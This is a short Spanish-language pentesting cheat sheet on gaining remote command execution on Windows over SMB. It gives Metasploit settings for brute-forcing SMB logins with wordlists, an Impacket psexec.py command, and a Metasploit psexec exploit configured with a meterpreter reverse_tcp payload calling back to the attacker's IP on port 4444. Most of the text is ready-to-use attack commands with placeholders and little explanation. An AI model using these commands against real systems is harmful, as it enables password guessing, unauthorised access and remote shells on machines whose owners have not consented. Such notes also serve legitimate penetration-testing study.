Permite ejecución remota de comandos en sistemas Windows usando credenciales válidas.

• Requiere usuario y contraseña  
• Usa SMB (puerto 445)  
• Permite obtener shell

## SMB Login (Brute Force)

Obtiene credenciales válidas para SMB.

```
use auxiliary/scanner/smb/smb_login 
```
	set USER_FILE DICCIONARIO
	set PASS_FILE DICCIONARIO
	set RHOSTS IP

## PsExec (Impacket)

Ejecución remota de comandos con credenciales válidas.

```
psexec.py USER@IP cmd.exe
```

## PsExec (Metasploit)

Explota SMB para obtener acceso remoto.

```
use exploit/windows/smb/psexec
```
	set RHOSTS IP  
	set RPORT 445  
	set SMBUser USER  
	set SMBPass PASSWORD  
	set PAYLOAD windows/meterpreter/reverse_tcp  
	set LHOST TU_IP  
	set LPORT 4444

